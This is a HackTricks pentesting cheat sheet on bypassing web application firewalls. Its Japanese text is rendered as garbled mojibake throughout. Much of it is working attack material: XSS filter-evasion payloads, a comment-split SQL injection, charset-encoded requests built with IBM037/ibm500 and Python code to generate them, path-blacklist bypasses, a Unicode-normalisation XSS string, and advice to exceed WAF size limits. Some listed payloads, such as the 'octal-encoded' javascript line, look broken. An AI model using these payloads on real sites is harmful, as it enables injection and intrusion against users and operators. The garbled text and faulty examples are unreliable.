# WAF ãƒã‚¤ãƒ‘ã‚¹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricks ã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª [**NFT**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã® PEASS & HackTricks ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricks ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)** ã« PR ã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## æ­£è¦è¡¨ç¾ãƒã‚¤ãƒ‘ã‚¹
ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ä¸Šã®æ­£è¦è¡¨ç¾ãƒ•ã‚£ãƒ«ã‚¿ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ã€ã•ã¾ã–ã¾ãªãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä¾‹ã¨ã—ã¦ã€å¤§æ–‡å­—å°æ–‡å­—ã®äº¤äº’ä½¿ç”¨ã€æ”¹è¡Œã®è¿½åŠ ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ãªã©ãŒã‚ã‚Šã¾ã™ã€‚ãƒã‚¤ãƒ‘ã‚¹ã®ãŸã‚ã®ãƒªã‚½ãƒ¼ã‚¹ã¯ã€[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)ã¨[OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã¯ã€[ã“ã®è¨˜äº‹](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)ã‹ã‚‰å¼•ç”¨ã•ã‚Œã¾ã—ãŸã€‚
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## æ–‡å­—ã‚»ãƒƒãƒˆã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°

WAFï¼ˆWeb Application Firewallï¼‰ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ä¸€èˆ¬çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚WAFã¯ã€æ‚ªæ„ã®ã‚ã‚‹ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚„æ”»æ’ƒã‚’æ¤œå‡ºã—ã€é®æ–­ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚WAFã¯ã€ä¸€èˆ¬çš„ãªæ”»æ’ƒãƒ‘ã‚¿ãƒ¼ãƒ³ã‚„è„†å¼±æ€§ã«å¯¾ã—ã¦ä¿è­·ã™ã‚‹ãŸã‚ã«ã€ç‰¹å®šã®ãƒ«ãƒ¼ãƒ«ã‚„ãƒ•ã‚£ãƒ«ã‚¿ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

WAFãƒã‚¤ãƒ‘ã‚¹ã®ä¸€ã¤ã®æ–¹æ³•ã¯ã€æ–‡å­—ã‚»ãƒƒãƒˆã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã™ã€‚WAFã¯ã€ç‰¹å®šã®æ–‡å­—ã‚»ãƒƒãƒˆã‚’æ¤œå‡ºã—ã¦ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯ã€WAFãŒæ¤œå‡ºã§ããªã„ã‚ˆã†ãªåˆ¥ã®æ–‡å­—ã‚»ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€WAFã®ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€ä¸€èˆ¬çš„ãªæ–‡å­—ã‚»ãƒƒãƒˆã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ–¹æ³•ã®ä¾‹ã§ã™ã€‚

- UTF-8ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ï¼šæ”»æ’ƒè€…ã¯ã€URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã‚„ãƒ‘ãƒ¼ã‚»ãƒ³ãƒˆã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦ã€UTF-8ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€æ”»æ’ƒè€…ã¯ã€Œ%C0%AFã€ã¨ã„ã†ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€WAFã®ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

- Unicodeã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ï¼šæ”»æ’ƒè€…ã¯ã€Unicodeã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦ã€WAFã®ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€æ”»æ’ƒè€…ã¯ã€Œ%u2215ã€ã¨ã„ã†ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€WAFã®ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã‚’å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

WAFãƒã‚¤ãƒ‘ã‚¹ã®æˆåŠŸã¯ã€WAFãŒä½¿ç”¨ã—ã¦ã„ã‚‹æ–‡å­—ã‚»ãƒƒãƒˆã®æ¤œå‡ºæ–¹æ³•ã«ä¾å­˜ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯ã€WAFã®å‹•ä½œã‚’åˆ†æã—ã€é©åˆ‡ãªã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ–¹æ³•ã‚’é¸æŠã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³

Obfuscation is a technique used to make code or data difficult to understand or analyze. In the context of web application security, obfuscation can be used to bypass Web Application Firewalls (WAFs) that are designed to detect and block malicious requests.

ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã‚³ãƒ¼ãƒ‰ã‚„ãƒ‡ãƒ¼ã‚¿ã‚’ç†è§£ã‚„è§£æãŒå›°é›£ã«ã™ã‚‹ãŸã‚ã®æŠ€è¡“ã§ã™ã€‚Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®æ–‡è„ˆã§ã¯ã€ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ¤œå‡ºã—ã¦ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ï¼ˆWAFï¼‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

### Techniques for Obfuscation

### ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æŠ€è¡“

There are several techniques that can be used for obfuscation:

ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯ã€ã„ãã¤ã‹ã®æŠ€è¡“ãŒã‚ã‚Šã¾ã™ã€‚

- **String obfuscation**: This technique involves encrypting or encoding strings in the code to make them unreadable. The strings can be decrypted or decoded at runtime to retrieve the original values.

- **æ–‡å­—åˆ—ã®ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³**: ã“ã®æŠ€è¡“ã¯ã€ã‚³ãƒ¼ãƒ‰å†…ã®æ–‡å­—åˆ—ã‚’æš—å·åŒ–ã¾ãŸã¯ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¦èª­ã‚ãªãã™ã‚‹ã‚‚ã®ã§ã™ã€‚æ–‡å­—åˆ—ã¯å®Ÿè¡Œæ™‚ã«å¾©å·åŒ–ã¾ãŸã¯ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã€å…ƒã®å€¤ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

- **Code obfuscation**: This technique involves modifying the code structure and logic to make it more complex and difficult to understand. This can include renaming variables and functions, adding unnecessary code, or using obfuscated control flow.

- **ã‚³ãƒ¼ãƒ‰ã®ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³**: ã“ã®æŠ€è¡“ã¯ã€ã‚³ãƒ¼ãƒ‰ã®æ§‹é€ ã¨ãƒ­ã‚¸ãƒƒã‚¯ã‚’å¤‰æ›´ã—ã¦ã€ã‚ˆã‚Šè¤‡é›‘ã§ç†è§£ã—ã«ããã™ã‚‹ã‚‚ã®ã§ã™ã€‚ã“ã‚Œã«ã¯ã€å¤‰æ•°ã‚„é–¢æ•°ã®åå‰ã‚’å¤‰æ›´ã™ã‚‹ã€ä¸è¦ãªã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹ã€ã¾ãŸã¯ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã•ã‚ŒãŸåˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ãªã©ãŒå«ã¾ã‚Œã¾ã™ã€‚

- **Payload obfuscation**: This technique involves modifying the payload of a request to evade detection by a WAF. This can include encoding the payload, splitting it into multiple parts, or using alternative encodings.

- **ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³**: ã“ã®æŠ€è¡“ã¯ã€WAFã«ã‚ˆã‚‹æ¤œå‡ºã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã‚‚ã®ã§ã™ã€‚ã“ã‚Œã«ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã€è¤‡æ•°ã®ãƒ‘ãƒ¼ãƒˆã«åˆ†å‰²ã™ã‚‹ã€ã¾ãŸã¯ä»£æ›¿ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ãªã©ãŒå«ã¾ã‚Œã¾ã™ã€‚

- **Protocol obfuscation**: This technique involves modifying the protocol used for communication to hide the true nature of the traffic. This can include using encryption, tunneling, or other techniques to obfuscate the network traffic.

- **ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³**: ã“ã®æŠ€è¡“ã¯ã€é€šä¿¡ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’å¤‰æ›´ã—ã¦ã€ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®çœŸã®æ€§è³ªã‚’éš ã™ã‚‚ã®ã§ã™ã€‚ã“ã‚Œã«ã¯ã€æš—å·åŒ–ã€ãƒˆãƒ³ãƒãƒªãƒ³ã‚°ã€ã¾ãŸã¯ä»–ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ãŒå«ã¾ã‚Œã¾ã™ã€‚

### Bypassing WAFs with Obfuscation

### ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ãŸWAFã®ãƒã‚¤ãƒ‘ã‚¹

By using obfuscation techniques, it is possible to bypass WAFs that rely on signature-based detection or simple pattern matching. The obfuscated code or payload may appear benign or legitimate to the WAF, allowing malicious requests to pass through undetected.

ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚·ã‚°ãƒãƒãƒ£ãƒ™ãƒ¼ã‚¹ã®æ¤œå‡ºã‚„å˜ç´”ãªãƒ‘ã‚¿ãƒ¼ãƒ³ãƒãƒƒãƒãƒ³ã‚°ã«ä¾å­˜ã™ã‚‹WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã‚„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€WAFã«ã¨ã£ã¦ç„¡å®³ã¾ãŸã¯åˆæ³•çš„ã«è¦‹ãˆã‚‹ãŸã‚ã€æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ¤œå‡ºã•ã‚Œãšã«é€šéã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

It is important to note that obfuscation is not a foolproof method for bypassing WAFs. Advanced WAFs may employ more sophisticated techniques to detect obfuscated code or payloads. Additionally, obfuscation can make code more difficult to maintain and debug, so it should be used judiciously and with caution.

ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®å®Œå…¨ãªæ–¹æ³•ã§ã¯ãªã„ã“ã¨ã«æ³¨æ„ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚é«˜åº¦ãªWAFã¯ã€ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã‚„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«ã‚ˆã‚Šæ´—ç·´ã•ã‚ŒãŸæŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ã‚ªãƒ–ãƒ•ã‚¹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã‚³ãƒ¼ãƒ‰ã®ä¿å®ˆã‚„ãƒ‡ãƒãƒƒã‚°ã‚’ã‚ˆã‚Šå›°é›£ã«ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€æ…é‡ã«ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## Unicodeã®äº’æ›æ€§
Unicodeã®æ­£è¦åŒ–ã®å®Ÿè£…ã«ã‚ˆã£ã¦ã¯ï¼ˆè©³ç´°ã¯[ã“ã¡ã‚‰](https://jlajara.gitlab.io/Bypass_WAF_Unicode)ã‚’å‚ç…§ï¼‰ã€Unicodeã®äº’æ›æ€§ã‚’æŒã¤æ–‡å­—ã¯WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦æ„å›³ã—ãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¨ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚äº’æ›æ€§ã®ã‚ã‚‹æ–‡å­—ã¯[ã“ã¡ã‚‰](https://www.compart.com/en/unicode)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ä¾‹
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
## ã‚µã‚¤ã‚ºåˆ¶é™ã®è¶…é

ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ™ãƒ¼ã‚¹ã®WAFã§ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒXã‚µã‚¤ã‚ºã‚ˆã‚Šå¤§ãã„å ´åˆã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯WAFã«ã‚ˆã£ã¦ãƒã‚§ãƒƒã‚¯ã•ã‚Œã¾ã›ã‚“ã€‚ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ç°¡å˜ã«ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
